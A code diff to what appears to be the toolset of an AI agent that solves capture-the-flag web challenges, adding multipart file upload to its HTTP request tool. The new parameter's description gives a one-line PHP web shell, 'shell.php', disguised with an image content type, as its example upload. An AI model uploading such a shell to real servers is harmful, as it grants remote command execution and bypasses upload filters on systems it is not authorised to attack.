@@ -32,7 +32,8 @@ TOOL_DEFINITIONS: List[Dict[str, Any]] = [
             "name": "http_request",
             "description": (
                 "Make an HTTP request to a URL. Use for interacting with CTF web "
-                "challenges - fetching pages, submitting forms, testing injections."
+                "challenges - fetching pages, submitting forms, testing injections, "
+                "uploading files. Supports multipart file upload via 'files' parameter."
             ),
             "parameters": {
                 "type": "object",
@@ -56,7 +57,15 @@ TOOL_DEFINITIONS: List[Dict[str, Any]] = [
                     },
                     "form": {
                         "type": "object",
-                        "description": "Structured HTML form fields for application/x-www-form-urlencoded or multipart-style submissions.",
+                        "description": "Structured HTML form fields for application/x-www-form-urlencoded.",
+                    },
+                    "files": {
+                        "type": "object",
+                        "description": (
+                            "Multipart file upload. Keys are form field names, values are objects "
+                            "with {filename, content, content_type}. Example: "
+                            "{\"uploaded\": {\"filename\": \"shell.php\", \"content\": \"<?php system($_GET['cmd']); ?>\", \"content_type\": \"image/jpeg\"}}"
+                        ),
                     },
                     "params": {
                         "type": "object",
@@ -64,7 +73,7 @@ TOOL_DEFINITIONS: List[Dict[str, Any]] = [
                     },
                     "allow_redirects": {
                         "type": "boolean",
-                        "description": "Whether to follow HTTP redirects. Default: true. Set false for login/register flows to inspect 302 Location headers.",
+                        "description": "Whether to follow HTTP redirects. Default: true.",
                     },
                 },
                 "required": ["url"],
@@ -294,6 +303,7 @@ def _exec_http_request(args: Dict[str, Any], session: Optional[requests.Session]
     data = args.get("data")
     form = args.get("form")
     params = args.get("params")
+    files = args.get("files")  # multipart file upload support
     allow_redirects = bool(args.get("allow_redirects", True))
 
     if not url:
@@ -305,12 +315,31 @@ def _exec_http_request(args: Dict[str, Any], session: Optional[requests.Session]
 
         client = session or requests
         request_data = form if isinstance(form, dict) and form else data
+
+        # Build files dict for multipart upload
+        # Format: {"field_name": ("filename", content_bytes, "content_type")}
+        files_dict = None
+        if files and isinstance(files, dict):
+            files_dict = {}
+            for field_name, file_spec in files.items():
+                if isinstance(file_spec, dict):
+                    fname = file_spec.get("filename", "file.txt")
+                    content = file_spec.get("content", "").encode("utf-8")
+                    ctype = file_spec.get("content_type", "application/octet-stream")
+                    files_dict[field_name] = (fname, content, ctype)
+                elif isinstance(file_spec, str):
+                    files_dict[field_name] = (field_name, file_spec.encode("utf-8"), "text/plain")
+            # When uploading files, don't pass data as it conflicts
+            if files_dict:
+                request_data = None
+
         resp = client.request(
             method=method,
             url=url,
             headers=req_headers,
             data=request_data,
             params=params,
+            files=files_dict,
             timeout=30,
             allow_redirects=allow_redirects,
             verify=False,
